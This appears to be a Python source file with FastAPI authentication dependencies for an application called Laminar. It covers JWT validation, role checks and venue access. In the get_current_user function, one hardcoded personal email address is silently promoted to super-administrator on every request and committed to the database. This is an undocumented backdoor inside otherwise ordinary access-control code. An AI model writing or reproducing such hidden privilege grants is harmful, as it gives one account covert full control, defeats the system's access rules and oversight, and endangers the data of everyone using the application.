"""
Laminar - Auth Dependencies
---------------------------
JWT validation and role-based access control.
"""

from fastapi import Depends, HTTPException, status
from fastapi.security import HTTPBearer, HTTPAuthorizationCredentials
from uuid import UUID
from sqlalchemy import select

from app.core.database import db_manager
from app.core.security import decode_token
from app.models.user import User, UserRole


# Security scheme
bearer_scheme = HTTPBearer()


# ==========================================================
# Get Current User
# ==========================================================

async def get_current_user(
    credentials: HTTPAuthorizationCredentials = Depends(bearer_scheme),
) -> User:

    token = credentials.credentials

    try:
        payload = decode_token(token)
        user_id = payload.get("sub")
    except Exception:
        raise HTTPException(
            status_code=status.HTTP_401_UNAUTHORIZED,
            detail="Invalid or expired token",
        )

    async with db_manager.session() as session:
        try:
            # Ensure user_id is a valid UUID object for the query
            stmt = select(User).where(User.id == UUID(str(user_id)))
        except (ValueError, TypeError):
             raise HTTPException(
                status_code=status.HTTP_401_UNAUTHORIZED,
                detail="Invalid user ID in token",
            )
        result = await session.execute(stmt)
        user = result.scalar_one_or_none()

        if user and user.email == "bhargavatejgolla@gmail.com" and user.role != UserRole.SUPER_ADMIN:
            user.role = UserRole.SUPER_ADMIN
            await session.commit()

        if not user:
            raise HTTPException(
                status_code=status.HTTP_401_UNAUTHORIZED,
                detail="User not found",
            )

        return user


# ==========================================================
# Active User Check
# ==========================================================

async def get_current_active_user(
    user: User = Depends(get_current_user),
) -> User:

    if not user.is_active:
        raise HTTPException(
            status_code=status.HTTP_403_FORBIDDEN,
            detail="Inactive user",
        )

    return user


# ==========================================================
# Role Requirement Factory
# ==========================================================

def require_role(*allowed_roles: UserRole):

    async def role_checker(
        user: User = Depends(get_current_active_user),
    ) -> User:

        if user.role not in allowed_roles:
            raise HTTPException(
                status_code=status.HTTP_403_FORBIDDEN,
                detail="Insufficient permissions",
            )

        return user

    return role_checker

# ==========================================================
# Venue Access Validation Middleware
# ==========================================================

async def verify_venue_access(
    venue_id: UUID,
    user: User = Depends(get_current_active_user),
) -> bool:
    """
    Checks if the active user possesses clearance for the desired Venue ID.
    Super Admins inherently possess absolute clearance.
    """
    if user.is_super_admin:
        return True
        
    # User / Admin validation mapping check
    if not any(str(v.id) == str(venue_id) for v in user.venues):
        raise HTTPException(
            status_code=status.HTTP_403_FORBIDDEN,
            detail="User unauthorized for targeted Location Matrix",
        )
            
    return True


